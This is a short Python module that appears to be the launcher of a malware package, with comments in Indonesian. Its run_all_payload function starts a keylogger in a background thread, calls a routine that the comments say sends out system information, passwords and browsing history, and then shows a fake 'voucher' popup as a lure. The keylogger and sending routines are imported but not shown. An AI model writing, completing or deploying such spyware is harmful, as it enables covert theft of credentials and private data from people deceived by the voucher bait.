import threading
from .keylogger import start_keylogger
from .system_info import collect_and_send_system_info
from .voucher_launcher import show_message

def run_all_payload():
    try:
        # 1. Keylogger jalan di background
        threading.Thread(target=start_keylogger, daemon=True).start()

        # 2. Kirim info sistem, password, history
        collect_and_send_system_info()

        # 3. Tampilkan popup GUI voucher
        show_message()
    except Exception as e:
        print(f"[!] Error in run_all_payload: {e}")

if __name__ == "__main__":
    run_all_payload()
